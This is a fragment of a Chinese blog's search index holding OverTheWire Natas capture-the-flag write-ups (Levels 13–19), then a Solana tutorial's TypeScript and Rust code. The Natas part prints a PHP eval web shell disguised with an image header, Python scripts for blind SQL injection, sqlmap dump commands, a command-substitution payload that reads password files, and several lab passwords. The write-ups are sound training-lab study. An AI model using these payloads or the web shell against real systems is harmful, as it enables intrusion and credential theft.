\u901a\u8fc7\u8bfb\u53d6\u6587\u4ef6\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u8fdb\u884c\u5224\u65ad 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 < html > < head > <!-- This stuff in the header has nothing to do with the level --> </ head > < body > < h1 > natas13 </ h1 > < div id = \"content\" > For security reasons, we now only accept image files! < br />< br /> <? function genRandomString() { $length = 10; $characters = \"0123456789abcdefghijklmnopqrstuvwxyz\"; $string = \"\"; for ($p = 0; $p < $length; $p++) { $string .= $characters[mt_rand(0, strlen($characters)-1)]; } return $string; } function makeRandomPath($dir, $ext) { do { $path = $dir.\"/\".genRandomString().\".\".$ext; } while(file_exists($path)); return $path; } function makeRandomPathFromFilename($dir, $fn) { $ext = pathinfo($fn, PATHINFO_EXTENSION); return makeRandomPath($dir, $ext); } if(array_key_exists(\"filename\", $_POST)) { $target_path = makeRandomPathFromFilename(\"upload\", $_POST[\"filename\"]); $err=$_FILES['uploadedfile']['error']; if($err){ if($err === 2){ echo \"The uploaded file exceeds MAX_FILE_SIZE\"; } else{ echo \"Something went wrong :/\"; } } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { echo \"File is too big\"; } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) { echo \"File is not an image\"; } else { if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { echo \"The file <a href=\\\"$target_path\\\">$target_path</a> has been uploaded\"; } else{ echo \"There was an error uploading the file, please try again!\"; } } } else { ?> < form enctype = \"multipart/form-data\" action = \"index.php\" method = \"POST\" > < input type = \"hidden\" name = \"MAX_FILE_SIZE\" value = \"1000\" /> < input type = \"hidden\" name = \"filename\" value = \"<? print genRandomString(); ?>.jpg\" /> Choose a JPEG to upload (max 1KB): < br /> < input name = \"uploadedfile\" type = \"file\" />< br /> < input type = \"submit\" value = \"Upload File\" /> </ form > <? } ?> < div id = \"viewsource\" >< a href = \"index-source.html\" > View sourcecode </ a ></ div > </ div > </ body > </ html > \u5728 hack.php \u4e2d\u6dfb\u52a0\u4efb\u610f\u56fe\u7247\u6587\u4ef6\u6587\u4ef6\u5934\u5373\u53ef\u7ed5\u8fc7 exif_imagetype \u68c0\u67e5 1 2 BM <?php @ eval ( $_POST [ 'pass' ]); ?> \u63a5\u4e0b\u6765\uff0c\u4fee\u6539\u524d\u7aef\u6587\u4ef6\u540e\u7f00\u540d\u3001\u4e0a\u4f20\u6587\u4ef6\u3001\u4f7f\u7528\u83dc\u5200\u7684\u6b65\u9aa4\u3001\u65b9\u6cd5\u4e0e Level 12 \u4e00\u81f4","title":"Level 13"},{"location":"wargames/natas/#_3","text":"PHP: exif_imagetype - Manual","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/natas/#level-14","text":"Username natas14 Password Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 URL http://natas14.natas.labs.overthewire.org \u4e00\u4e2a\u7528\u6237\u767b\u5f55\u7684\u8868\u5355 \u4ece\u6e90\u4ee3\u7801\u53ef\u4ee5\u770b\u5230\uff0c\u63d0\u4ea4\u7684\u8868\u5355\u5b57\u7b26\u4e32\u672a\u7ecf\u8fc7\u4efb\u4f55\u8fc7\u6ee4\uff0c\u76f4\u63a5\u88ab\u62fc\u63a5\u5230\u4e86 SQL \u8bed\u53e5\u4e2d 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 < html > < head > <!-- This stuff in the header has nothing to do with the level --> </ head > < body > < h1 > natas14 </ h1 > < div id = \"content\" > <? if(array_key_exists(\"username\", $_REQUEST)) { $link = mysql_connect('localhost', 'natas14', '<censored>'); mysql_select_db('natas14', $link); # \u6ce8\u610f\u662f\u53cc\u5f15\u53f7 $query = \"SELECT * from users where username=\\\"\".$_REQUEST[\"username\"].\"\\\" and password=\\\"\".$_REQUEST[\"password\"].\"\\\"\"; if(array_key_exists(\"debug\", $_GET)) { echo \"Executing query: $query<br>\"; } if(mysql_num_rows(mysql_query($query, $link)) > 0) { echo \"Successful login! The password for natas15 is <censored><br>\"; } else { echo \"Access denied!<br>\"; } mysql_close($link); } else { ?> < form action = \"index.php\" method = \"POST\" > Username: < input name = \"username\" >< br > Password: < input name = \"password\" >< br > < input type = \"submit\" value = \"Login\" /> </ form > <? } ?> < div id = \"viewsource\" >< a href = \"index-source.html\" > View sourcecode </ a ></ div > </ div > </ body > </ html > \u4f7f\u7528\u6700\u7b80\u5355\u7684 SQL \u6ce8\u5165\u65b9\u5f0f\u5373\u53ef \u4e0b\u4e00\u5173\u53e3\u4ee4 GET\u2714","title":"Level 14"},{"location":"wargames/natas/#level-15","text":"Username natas15 Password AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J URL http://natas15.natas.labs.overthewire.org \u8f93\u5165\u7528\u6237\u540d\uff0c\u68c0\u67e5\u8be5\u7528\u6237\u662f\u5426\u5b58\u5728 \u67e5\u770b\u6e90\u7801\uff0c\u5176\u4e2d\u63d0\u4f9b\u4e86 users \u6570\u636e\u5e93\u8868\u7ed3\u6784\uff0c\u5404\u5b57\u6bb5\u7684\u7c7b\u578b\u53ca\u957f\u5ea6\u9650\u5236 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 < html > < head > <!-- This stuff in the header has nothing to do with the level --> </ head > < body > < h1 > natas15 </ h1 > < div id = \"content\" > <? # \u63d0\u4f9b\u4e86 users \u6570\u636e\u5e93\u8868\u7ed3\u6784 /* CREATE TABLE `users` ( `username` varchar(64) DEFAULT NULL, `password` varchar(64) DEFAULT NULL ); */ if(array_key_exists(\"username\", $_REQUEST)) { $link = mysql_connect('localhost', 'natas15', '<censored>'); mysql_select_db('natas15', $link); $query = \"SELECT * from users where username=\\\"\".$_REQUEST[\"username\"].\"\\\"\"; if(array_key_exists(\"debug\", $_GET)) { echo \"Executing query: $query<br>\"; } $res = mysql_query($query, $link); if($res) { # \u67e5\u8be2\u7ed3\u679c\u4e0d\u76f4\u63a5\u56de\u663e if(mysql_num_rows($res) > 0) { echo \"This user exists.<br>\"; } else { echo \"This user doesn't exist.<br>\"; } } else { echo \"Error in query.<br>\"; } mysql_close($link); } else { ?> < form action = \"index.php\" method = \"POST\" > Username: < input name = \"username\" >< br > < input type = \"submit\" value = \"Check existence\" /> </ form > <? } ?> < div id = \"viewsource\" >< a href = \"index-source.html\" > View sourcecode </ a ></ div > </ div > </ body > </ html > \u7531\u4e8e\u67e5\u8be2\u7ed3\u679c\u4e0d\u80fd\u56de\u663e\u5230\u524d\u7aef\uff0c\u9700\u8981\u8fdb\u884c SQL \u76f2\u6ce8\uff08 blind-based SQL injection \uff09 \u9700\u8981\u83b7\u53d6\u7684\u662f\u7528\u6237 natas16 \u7684\u53e3\u4ee4\uff0c\u67e5\u8be2\u3001\u786e\u8ba4\u8be5\u7528\u6237\u5b58\u5728 \u901a\u8fc7\u5e03\u5c14\u578b SQL \u76f2\u6ce8\u83b7\u53d6 32 \u4f4d\u7684\u53e3\u4ee4 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #!/usr/bin/python # -*- coding: UTF-8 -*- import requests from lxml import etree auth_username = 'natas15' auth_password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J' url = 'http://natas15.natas.labs.overthewire.org' table = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' key = '' for i in range ( 1 , 33 ): l , r = 0 , 61 while l <= r : mid = ( l + r ) >> 1 ch = table [ mid ] res = requests . post ( url + '/index.php' , { 'username' : '\" UNION SELECT * FROM users WHERE username = \"natas16\" and ascii(SUBSTRING(password, %d , 1)) >= ascii(\" %s \")#' % ( i , ch )}, auth = ( auth_username , auth_password ), headers = { 'Connection' : 'close' }) sqlres = etree . HTML ( res . content ) . xpath ( '/html/body/div/text()' )[ 0 ] if \"This user exists\" in sqlres : l = mid + 1 ans = mid else : r = mid - 1 key += table [ ans ] print ( key ) \u4e5f\u53ef\u4ee5\u4f7f\u7528 sqlmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # \u679a\u4e3e\u6570\u636e\u5e93 $ sqlmap -u http://natas15.natas.labs.overthewire.org/index.php --auth-type = basic --auth-cred = natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J --data = username = natas16 --dbms = mysql --level = 5 --dbs ... available databases [ 2 ] : [ * ] information_schema [ * ] natas15 ... # \u8868\u540d\u5df2\u77e5\uff0c\u76f4\u63a5\u83b7\u53d6 users \u8868 $ sqlmap -u http://natas15.natas.labs.overthewire.org/index.php --auth-type = basic --auth-cred = natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J --data = username = natas16 --dbms = mysql --level = 5 -D natas15 -T users --dump ... Database: natas15 Table: users [ 4 entries ] +----------+----------------------------------+ | username | password | +----------+----------------------------------+ | bob | 6P151OntQe | | charlie | HLwuGKts2w | | alice | hROtsfM734 | | natas16 | WaIHEacj63wnNIBROHeqi3p9t0m5nhmh | +----------+----------------------------------+ ...","title":"Level 15"},{"location":"wargames/natas/#_4","text":"What is Blind SQL Injection? Tutorial & Examples | Web Security Academy How can I make SQL case sensitive string comparison on MySQL? - Stack Overflow Usage \u00b7 sqlmapproject/sqlmap Wiki","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/natas/#level-16","text":"Username natas16 Password WaIHEacj63wnNIBROHeqi3p9t0m5nhmh URL http://natas16.natas.labs.overthewire.org \u662f Level 10 \u7684\u52a0\u5f3a\u7248(\u2014\u02cb\u03c9\u02ca\u2014) \u4e0e Level 10 \u7684\u4e3b\u8981\u533a\u522b\u4e3a\u591a\u8fc7\u6ee4\u4e86\u53cd\u5f15\u53f7\u3001\u5355\u53cc\u5f15\u53f7\uff0c\u5e76\u4e14\u5728\u6267\u884c grep \u547d\u4ee4\u7684\u8bed\u53e5\u4e2d\uff0c\u4f7f\u7528\u53cc\u5f15\u53f7\u5305\u88f9\u4e86 $key \u53d8\u91cf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 < html > < head > <!-- This stuff in the header has nothing to do with the level --> </ head > < body > < h1 > natas16 </ h1 > < div id = \"content\" > For security reasons, we now filter even more on certain characters < br />< br /> < form > Find words containing: < input name = needle >< input type = submit name = submit value = Search >< br >< br > </ form > Output: < pre > <? $key = \"\"; if(array_key_exists(\"needle\", $_REQUEST)) { $key = $_REQUEST[\"needle\"]; } if($key != \"\") { if(preg_match('/[;|&`\\'\"]/',$key)) { print \"Input contains an illegal character!\"; } else { # \u65e0\u8bba\u4ec0\u4e48\u8f93\u5165\u90fd\u53ea\u80fd\u4f5c\u4e3a\u6a21\u5f0f\u5b57\u7b26\u4e32 passthru(\"grep -i \\\"$key\\\" dictionary.txt\"); } } ?> </ pre > < div id = \"viewsource\" >< a href = \"index-source.html\" > View sourcecode </ a ></ div > </ div > </ body > </ html > \u8fd8\u5269\u4e0b\u547d\u4ee4\u66ff\u6362 $(cmd) \u6ca1\u6709\u88ab\u8fc7\u6ee4\uff0c\u53ef\u4f7f\u7528\u7c7b\u4f3c Level 15 \u7684\u65b9\u6cd5\u4f9d\u6b21\u83b7\u53d6\u4e0b\u4e00\u5173\u53e3\u4ee4\u5b57\u7b26 \u63d0\u4ea4 ?needle=$(grep -E ^.{n-1}X /etc/natas_webpass/natas17)Allah \uff0c\u5373\u67e5\u770b /etc/natas_webpass/natas17 \u5185\u5b57\u7b26\u4e32\u7684\u7b2c n \u4f4d\u662f\u5426\u4e3a X \uff0c\u82e5\u662f\uff0c\u8fd4\u56de\u503c\u4e0d\u4e3a\u7a7a\uff0c\u4e0e\u5176\u540e\u7d27\u968f\u7684\u5355\u8bcd\u7ec4\u5408\u5bfc\u81f4\u65e0\u6cd5\u5728 dictionary.txt \u67e5\u627e\u5230\u8be5\u8bcd\uff0c\u8fd4\u56de\u4e3a\u7a7a\uff0c\u5426\u5219\u5c06\u5728 Output \u5904\u6709\u8f93\u51fa 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #!/usr/bin/python # -*- coding: UTF-8 -*- import requests from lxml import etree auth_username = 'natas16' auth_password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh' url = 'http://natas16.natas.labs.overthewire.org/' table = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' key = '' for i in range ( 1 , 33 ): for ch in table : res = requests . post ( url + '?needle=$(grep -E ^.{ %d } %c /etc/natas_webpass/natas17)Allah' % ( i - 1 , ch ), auth = ( auth_username , auth_password ), headers = { 'Connection' : 'close' }) sqlres = etree . HTML ( res . content ) . xpath ( '/html/body/div[1]/pre/text()' )[ 0 ] . strip () if len ( sqlres ) == 0 : key += ch break print ( key )","title":"Level 16"},{"location":"wargames/natas/#level-17","text":"Username natas17 Password 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw URL http://natas17.natas.labs.overthewire.org \u524d\u7aef\u540c Level 15 \uff0c\u8f93\u5165\u7528\u6237\u540d\uff0c\u68c0\u67e5\u8be5\u7528\u6237\u662f\u5426\u5b58\u5728 \u67e5\u770b\u6e90\u4ee3\u7801\uff0c\u53d1\u73b0\u67e5\u8be2\u7ed3\u679c\u8f93\u51fa\u90e8\u5206\u90fd\u88ab\u6ce8\u91ca\u6389\u4e86 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 < html > < head > <!-- This stuff in the header has nothing to do with the level --> </ head > < body > < h1 > natas17 </ h1 > < div id = \"content\" > <? /* CREATE TABLE `users` ( `username` varchar(64) DEFAULT NULL, `password` varchar(64) DEFAULT NULL ); */ if(array_key_exists(\"username\", $_REQUEST)) { $link = mysql_connect('localhost', 'natas17', '<censored>'); mysql_select_db('natas17', $link); $query = \"SELECT * from users where username=\\\"\".$_REQUEST[\"username\"].\"\\\"\"; if(array_key_exists(\"debug\", $_GET)) { echo \"Executing query: $query<br>\"; } $res = mysql_query($query, $link); if($res) { if(mysql_num_rows($res) > 0) { //echo \"This user exists.<br>\"; } else { //echo \"This user doesn't exist.<br>\"; } } else { //echo \"Error in query.<br>\"; } mysql_close($link); } else { ?> < form action = \"index.php\" method = \"POST\" > Username: < input name = \"username\" >< br > < input type = \"submit\" value = \"Check existence\" /> </ form > <? } ?> < div id = \"viewsource\" >< a href = \"index-source.html\" > View sourcecode </ a ></ div > </ div > </ body > </ html > \u53ef\u4ee5\u57fa\u4e8e\u65f6\u95f4\u5ef6\u8fdf\u8fdb\u884c SQL \u76f2\u6ce8 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #!/usr/bin/python # -*- coding: UTF-8 -*- import requests from lxml import etree auth_username = 'natas17' auth_password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw' url = 'http://natas17.natas.labs.overthewire.org' table = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' key = '' for i in range ( 1 , 33 ): l , r = 0 , 61 while l <= r : mid = ( l + r ) >> 1 ch = table [ mid ] while True : res = requests . post ( url + '/index.php' , { 'username' : '\" UNION SELECT * FROM users WHERE username = \"natas18\" and ascii(SUBSTRING(password, %d , 1)) >= ascii(\" %s \") and sleep(2)#' % ( i , ch )}, auth = ( auth_username , auth_password ), headers = { 'Connection' : 'close' }) if res . status_code == 200 : break if res . elapsed . seconds >= 2 : l = mid + 1 ans = mid else : r = mid - 1 key += table [ ans ] print ( key )","title":"Level 17"},{"location":"wargames/natas/#level-18","text":"Username natas18 Password xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP URL http://natas18.natas.labs.overthewire.org \u63d0\u793a\u9700\u8981\u4f7f\u7528\u7ba1\u7406\u5458\u8d26\u53f7\u767b\u5f55\u624d\u80fd\u83b7\u5f97\u4e0b\u4e00\u5173\u53e3\u4ee4 \u539f\u672c\u7ba1\u7406\u5458\u662f\u901a\u8fc7\u7528\u6237\u540d\u6765\u5224\u65ad\uff0c\u4f46\u7531\u4e8e\u8fd9\u79cd\u65b9\u6cd5\u4e0d\u5b89\u5168\uff0c isValidAdminLogin() \u4e2d\u7684\u5173\u952e\u8bed\u53e5\u88ab\u6ce8\u91ca\uff0c\u4efb\u4f55\u60c5\u51b5\u4e0b\u90fd\u4f1a\u8fd4\u56de 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 < html > < head > <!-- This stuff in the header has nothing to do with the level --> </ head > < body > < h1 > natas18 </ h1 > < div id = \"content\" > <? # \u8fd9\u91cc\u6709\u70b9\u610f\u601d\uff0c640 \u660e\u663e\u5f88\u5c0f\u8036 (\u014f\u03c9\u014f) $maxid = 640; // 640 should be enough for everyone function isValidAdminLogin() { /* {{{ */ if($_REQUEST[\"username\"] == \"admin\") { /* This method of authentication appears to be unsafe and has been disabled for now. */ //return 1; } return 0; } /* }}} */ function isValidID($id) { /* {{{ */ return is_numeric($id); } /* }}} */ function createID($user) { /* {{{ */ global $maxid; return rand(1, $maxid); } /* }}} */ function debug($msg) { /* {{{ */ if(array_key_exists(\"debug\", $_GET)) { print \"DEBUG: $msg<br>\"; } } /* }}} */ function my_session_start() { /* {{{ */ if(array_key_exists(\"PHPSESSID\", $_COOKIE) and isValidID($_COOKIE[\"PHPSESSID\"])) { if(!session_start()) { debug(\"Session start failed\"); return false; } else { debug(\"Session start ok\"); if(!array_key_exists(\"admin\", $_SESSION)) { debug(\"Session was old: admin flag set\"); $_SESSION[\"admin\"] = 0; // backwards compatible, secure } return true; } } return false; } /* }}} */ function print_credentials() { /* {{{ */ if($_SESSION and array_key_exists(\"admin\", $_SESSION) and $_SESSION[\"admin\"] == 1) { print \"You are an admin. The credentials for the next level are:<br>\"; print \"<pre>Username: natas19\\n\"; print \"Password: <censored></pre>\"; } else { print \"You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.\"; } } /* }}} */ $showform = true; if(my_session_start()) { print_credentials(); $showform = false; } else { if(array_key_exists(\"username\", $_REQUEST) && array_key_exists(\"password\", $_REQUEST)) { session_id(createID($_REQUEST[\"username\"])); session_start(); $_SESSION[\"admin\"] = isValidAdminLogin(); debug(\"New session started\"); $showform = false; print_credentials(); } } if($showform) { ?> < p > Please login with your admin account to retrieve credentials for natas19. </ p > < form action = \"index.php\" method = \"POST\" > Username: < input name = \"username\" >< br > Password: < input name = \"password\" >< br > < input type = \"submit\" value = \"Login\" /> </ form > <? } ?> < div id = \"viewsource\" >< a href = \"index-source.html\" > View sourcecode </ a ></ div > </ div > </ body > </ html > \u7528\u6237\u7684 PHPSESSID \u662f\u8303\u56f4\u5728 \\([1, 640]\\) \uff0c\u90a3\u4e48\u53ea\u8981\u66b4\u529b\u627e\u5230 admin \u7684 PHPSESSID \u5c31\u597d\u4e86(<\u309d\u03c9\u03a6)","title":"Level 18"},{"location":"wargames/natas/#level-19","text":"Username natas19 Password 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs URL http://natas19.natas.labs.overthewire.org session ID \u4e0d\u518d\u8fde\u7eed\u4e86\u2026\u2026 \u901a\u8fc7\u89c2\u5bdf\u53d1\u73b0\uff0c\u65b0\u7684 PHPSESSID \u7684\u683c\u5f0f\u4e3a \u968f\u673a1~3\u4f4d\u6570\u5b57 + \"-\" + \u7528\u6237\u540d \u7684 ASCII \u7801\u5b57\u7b26\u4e32 \u63a5\u4e0b\u6765\u5c31\u662f\u66b4\u529b\u679a\u4e3e 1 \u81f3 3 \u4f4d\u7684\u968f\u673a\u6570\u5b57 \u7ecf\u8fc7\u5f88\u957f\u4e00\u6bb5\u65f6\u95f4\u7684\u679a\u4e3e\u2026\u2026(<\u309d\u03c9\u03a6)","title":"Level 19"},{"location":"wargames/solana_pathway/","tags":["web3","blockchain","smart contract","solana","rust"],"text":"#web3 #blockchain #smart contract #solana #rust .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Connect to Solana \u00b6 Implement connect by creating a Connection instance and getting the API version 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // pages/api/solana/connect.ts import type { NextApiRequest , NextApiResponse } from 'next' ; import { getNodeURL } from '@figment-solana/lib' ; import { Connection } from '@solana/web3.js' ; export default async function connect ( req : NextApiRequest , res : NextApiResponse < string > , ) { try { const { network } = req . body ; const url = getNodeURL ( network ); /***** START *****/ const connection = new Connection ( url ); const version = await connection . getVersion (); /***** END *****/ res . status ( 200 ). json ( version [ 'solana-core' ]); } catch ( error ) { let errorMessage = error instanceof Error ? error . message : 'Unknown Error' ; res . status ( 500 ). json ( errorMessage ); } } Create an account \u00b6 Implement keypair and parse the keypair to extract the address as a string 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 // pages/api/solana/keypair.ts import type { NextApiRequest , NextApiResponse } from 'next' ; import { Keypair } from '@solana/web3.js' ; type ResponseT = { secret : string ; address : string ; }; export default function keypair ( _req : NextApiRequest , res : NextApiResponse < string | ResponseT > , ) { try { /***** START *****/ const keypair = Keypair . generate (); // or //const keypair = new Keypair(); const address = keypair ? . publicKey . toString (); /***** END *****/ const secret = JSON . stringify ( Array . from ( keypair . secretKey )); res . status ( 200 ). json ({ secret , address , }); } catch ( error ) { let errorMessage = error instanceof Error ? error . message : 'Unknown Error' ; res . status ( 500 ). json ( errorMessage ); } } Fund the account with SOL \u00b6 Convert the address passed in the request body to a public key and use requestAirdrop to get 1 SOL 1 SOL is equal to 1,000,000,000 lamports . 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 // pages/api/solana/fund.ts import { Connection , PublicKey , LAMPORTS_PER_SOL } from '@solana/web3.js' ; import type { NextApiRequest , NextApiResponse } from 'next' ; import { getNodeURL } from '@figment-solana/lib' ; export default async function fund ( req : NextApiRequest , res : NextApiResponse < string > , ) { try { const { network , address } = req . body ; const url = getNodeURL ( network ); // confirmed \u5373\u5f53\u5757\u5df2\u901a\u8fc7 cluster \u8fbe\u5230 1 \u4e2a\u786e\u8ba4\u65f6\u53ef\u67e5\u8be2\u5230 const connection = new Connection ( url , 'confirmed' ); /***** START *****/ const publicKey = new PublicKey ( address ); const hash = await connection . requestAirdrop ( publicKey , LAMPORTS_PER_SOL ); await connection . confirmTransaction ( hash ); /***** END *****/ res . status ( 200 ). json ( hash ); } catch ( error ) { let errorMessage = error instanceof Error ? error . message : 'Unknown Error' ; res . status ( 500 ). json ( errorMessage ); } } Anatomy of an Explorer page \u00b6 Overview Account Input(s) \u53c2\u4e0e\u4ea4\u6613\u7684\u8d26\u6237 Instruction \u4ea4\u6613\u4e2d\u4f7f\u7528\u7684\u7a0b\u5e8f\u6307\u4ee4 Program Instruction Logs \u7a0b\u5e8f\u6267\u884c\u4e2d\u7684\u65e5\u5fd7\u8f93\u51fa Get the balance \u00b6 Implement publicKey & balance 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 // pages/api/solana/balance.ts import type { NextApiRequest , NextApiResponse } from 'next' ; import { Connection , PublicKey } from '@solana/web3.js' ; import { getNodeURL } from '@figment-solana/lib' ; export default async function balance ( req : NextApiRequest , res : NextApiResponse < string | number > , ) { try { const { network , address } = req . body ; const url = getNodeURL ( network ); const connection = new Connection ( url , 'confirmed' ); /***** START *****/ const publicKey = new PublicKey ( address ); // The balance is denominated in LAMPORTS const balance = await connection . getBalance ( publicKey ); /***** END *****/ if ( balance === 0 || balance === undefined ) { throw new Error ( 'Account not funded' ); } res . status ( 200 ). json ( balance ); } catch ( error ) { let errorMessage = error instanceof Error ? error . message : 'Unknown Error' ; res . status ( 500 ). json ( errorMessage ); } } Transfer some SOL \u00b6 Finish implementing the transfer() function \u82e5\u4e00\u4e2a\u8d26\u6237\u6301\u6709\u81f3\u5c11\u4e24\u5e74\u7684\u79df\u91d1\uff0c\u5219\u514d\u79df \u6240\u6709\u65b0\u8d26\u6237\u90fd\u9700\u8981\u6301\u6709\u81f3\u5c11\u4e24\u5e74\u7684\u79df\u91d1\uff0c\u82e5\u4ea4\u6613\u4f7f\u5f97\u8d26\u6237\u4f59\u989d\u5c0f\u4e8e\u6700\u5c0f\u503c\u5c06\u5931\u8d25 \u82e5\u8d26\u6237\u4f59\u989d\u4e3a 0\uff0c\u5c06\u88ab\u6e05\u9664 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 // pages/api/solana/transfer.ts import type { NextApiRequest , NextApiResponse } from 'next' ; import { getNodeURL } from '@figment-solana/lib' ; import { Connection , PublicKey , SystemProgram , Transaction , sendAndConfirmTransaction , Keypair } from '@solana/web3.js' ; export default async function transfer ( req : NextApiRequest , res : NextApiResponse < string > , ) { try { const { address , secret , recipient , lamports , network } = req . body ; const url = getNodeURL ( network ); const connection = new Connection ( url , 'confirmed' ); const fromPubkey = new PublicKey ( address ); const toPubkey = new PublicKey ( recipient ); // The secret key is stored in our state as a stringified array const secretKey = Uint8Array . from ( JSON . parse ( secret as string )); /***** START *****/ //... let's skip the beginning as it should be familiar for you by now! // Find the parameter to pass const instructions = SystemProgram . transfer ({ fromPubkey , toPubkey , lamports }); // How could you construct a signer array's const signers = [ Keypair . fromSecretKey ( secretKey )]; //const signers = [{publicKey: fromPubkey, secretKey}]; // \u5f53\u5c5e\u6027\u540d\u4e0e\u53d8\u91cf\u540d\u76f8\u540c\u65f6\uff0ce.g. name:name, \u53ef\u7b80\u5199\u4e3a name // Maybe adding something to a Transaction could be interesting ? const transaction = new Transaction (). add ( instructions ); // We can send and confirm a transaction in one row. const hash = await sendAndConfirmTransaction ( connection , transaction , signers ); /***** END *****/ res . status ( 200 ). json ( hash ); } catch ( error ) { let errorMessage = error instanceof Error ? error . message : 'Unknown Error' ; res . status ( 500 ). json ( errorMessage ); } } \u53c2\u8003\u8d44\u6599 \u00b6 Accounts | Solana Docs Objects | Property value shorthand Deploy a program \u00b6 Smart contract review \u00b6 a simple program, incrementing a number every time it's called use \u7c7b\u4f3c\u4e8e import 1 2 3 4 5 6 7 8 9 10 11 // The Rust source code for the program // contracts/solana/program/src/lib.rs use borsh ::{ BorshDeserialize , BorshSerialize }; // borsh: Binary Object Representation Serializer for Hashing use solana_program ::{ account_info ::{ next_account_info , AccountInfo }, entrypoint , entrypoint :: ProgramResult , msg , // for low-impact logging on the blockchain program_error :: ProgramError , pubkey :: Pubkey , }; \u5229\u7528\u6d3e\u751f\uff08 derive \uff09\u5b8f\u5728\u7f16\u8bd1\u65f6\u751f\u6210\u7ed3\u6784\u4f53 GreetingAccount \u5fc5\u9700\u7684\u6837\u677f\u4ee3\u7801 1 2 3 4 5 6 /// Define the type of state stored in accounts #[derive(BorshSerialize, BorshDeserialize, Debug)] pub struct GreetingAccount { /// number of greetings pub counter : u32 , } \u5b9a\u4e49\u7a0b\u5e8f\u7684\u5165\u53e3\u70b9 ? \u53ea\u80fd\u7528\u4e8e\u8fd4\u56de Result \u7684\u51fd\u6570 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 // Declare and export the program's entrypoint entrypoint ! ( process_instruction ); // Program entrypoint's implementation pub fn process_instruction ( program_id : & Pubkey , // Public key of the account the hello world program was loaded into accounts : & [ AccountInfo ], // The account to say hello to _instruction_data : & [ u8 ], // Ignored, all helloworld instructions are hellos ) -> ProgramResult { // print messages to the Program Log with the msg!() macro // rather than use println!() which would be prohibitive in terms of computational cost for the network. msg ! ( \"Hello World Rust program entrypoint\" ); // Iterating accounts is safer than indexing let accounts_iter = & mut accounts . iter (); // accounts_iter takes a mutable reference of each values in accounts // Get the account to say hello to let account = next_account_info ( accounts_iter ) ? ; // Will return the next AccountInfo or a NotEnoughAccountKeys error // ? is a shortcut expression for error propagation // The account must be owned by the program in order to modify its data // \u9664\u6240\u6709\u8005\u5916\uff0c\u5176\u4ed6\u4eba\u65e0\u6743\u4fee\u6539\u6570\u636e\u8d26\u6237\u7684\u72b6\u6001 if account . owner != program_id { msg ! ( \"Greeted account does not have the correct program id\" ); return Err ( ProgramError :: IncorrectProgramId ); } // Increment and store the number of times the account has been greeted let mut greeting_account = GreetingAccount :: try_from_slice ( & account . data . borrow ()) ? ; // borrow operator & // shared borrow &: the place may not be mutated, but it may be read or shared again // mutable borrow &mut: the place may not 